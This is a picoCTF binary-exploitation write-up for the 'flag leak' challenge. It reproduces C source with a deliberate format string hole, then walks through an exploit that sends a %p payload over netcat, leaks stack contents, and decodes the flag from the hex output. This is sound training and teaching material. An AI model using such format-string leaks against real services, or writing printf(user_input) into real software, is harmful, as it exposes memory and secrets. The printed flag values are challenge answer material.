# PicoCTF - flag leak

## Challenge Overview
**Title:** flag leak  
**Category:** Binary Exploitation  
**Difficulty:** Medium  
**Files Provided:** vuln.c, vuln

## Description
Story telling class 1/2

Additional details will be available after launching your challenge instance.

## Source Code
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,len,f); // size bound read
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}

```

## Analysis
In the code we find the classic format string vulnerability
```c
scanf("%127s", story);
printf("Here's a story - \n");
printf(story);
```
Above it we see that the flag sits in a local buffer
```c
char flag[BUFSIZE];
...
readflag(flag, FLAGSIZE);
```
So we can utilize the format string attack to read the flag of the stack.  
To do so, I will enter as my input a bunch of `%p` which grabs a value of the stack and prints it as pointer.  
The flag will start with `picoCTF` with `70 69 63 6F 43 54 46` as its hex representation.  
We will use this to locate the flag in the output.
```
$ nc saturn.picoctf.net 62772
Tell me a story and then I'll tell you one >> AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
Here's a story - 
AAAA0xff953cf00xff953d100x80493460x414141410x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x70257025(nil)0xf4c8e0000x80483380xf4c52d200xf4ad7ab00x6f6369700x7b4654430x6b34334c0x5f676e310x67346c460x6666305f0x3474535f0x395f6b630x303666350x7d3731360xfbad20000x44c68900(nil)0xf4c8e9900x804c0000x8049410(nil)
```

We find the start of the flag `0x6f636970` in the output.  
We grab the values until `0x7d373136` since the next byte (leas significant byte of the next value) is the NULL terminator.  
Since each word (4 bytes) is stored in Little Endian format we have to reverse each byte in every word.  
For example:
0x6f6369700 -> 0x7069636f

Once we do that, we convert them to ASCII characters using an online tool and get our flag

## Solution
- Enter `AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p`
- Find `0x6f636970` in the output and copy until `0x7d373136`
- For each word, reverse the bytes
- Convert to ASCII string

### Execution Example:
```
$ nc saturn.picoctf.net 62772
Tell me a story and then I'll tell you one >> AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
Here's a story - 
AAAA0xff953cf00xff953d100x80493460x414141410x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x70257025(nil)0xf4c8e0000x80483380xf4c52d200xf4ad7ab0"COPY"0x6f6369700x7b4654430x6b34334c0x5f676e310x67346c460x6666305f0x3474535f0x395f6b630x303666350x7d373136"END COPY"0xfbad20000x44c68900(nil)0xf4c8e9900x804c0000x8049410(nil)
```